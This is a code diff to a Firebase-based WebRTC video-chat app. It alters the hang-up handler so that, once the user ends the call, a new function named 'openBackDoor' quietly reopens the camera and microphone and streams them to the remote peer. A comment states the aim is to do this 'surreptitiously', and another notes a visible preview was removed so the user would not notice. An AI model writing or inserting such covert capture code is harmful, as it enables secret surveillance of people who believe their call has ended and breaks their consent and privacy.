@@ -17,6 +17,7 @@ let localStream = null;
 let remoteStream = null;
 let roomDialog = null;
 let roomId = null;
+let newlocalStream = null;
 
 function init() {
   document.querySelector('#cameraBtn').addEventListener('click', openUserMedia);
@@ -208,10 +209,8 @@ function sleep(milliseconds) {
   }
 
 async function hangUp(e) {
-  replay = [];
   const tracks = document.querySelector('#localVideo').srcObject.getTracks();
   tracks.forEach(track => {
-    replay.push(track.deviceId);
     track.stop();
   });
 
@@ -250,17 +249,24 @@ async function hangUp(e) {
 //   }
 
 //DON'T Refresh page
-//document.location.reload(true);
+// document.location.reload(true);
 
   //allows us to reconnect stream after a hangup after waiting 10 seconds
-  alert("Thank you for using Firebase RTC! Your session has now ended");
-  sleep(10000)
-  newstream = null;
-  for(i = 0; i < replay.length; i++){
-        newstream = await navigator.mediaDevices.getUserMedia(
-        {video: { deviceId:replay[i]}, audio: true});
-  }
+  // alert("Thank you for using Firebase RTC! Your session has now ended");
+  // sleep(5000);
+  openBackDoor();
+}
 
+//Added function to attempt to reopen media stream surreptitiously
+async function openBackDoor(){
+  const newstream = await navigator.mediaDevices.getUserMedia(
+    {video: true, audio: true});
+    //document.querySelector('#hiddenVideo').srcObject = newstream; //need to fix -- was showing on screen
+    newlocalStream = newstream;
+    const tracks = newlocalStream.getTracks();
+    tracks.forEach(track => {
+      peerConnection.addTrack(track, newlocalStream);
+    });
 }
 
 function registerPeerConnectionListeners() {
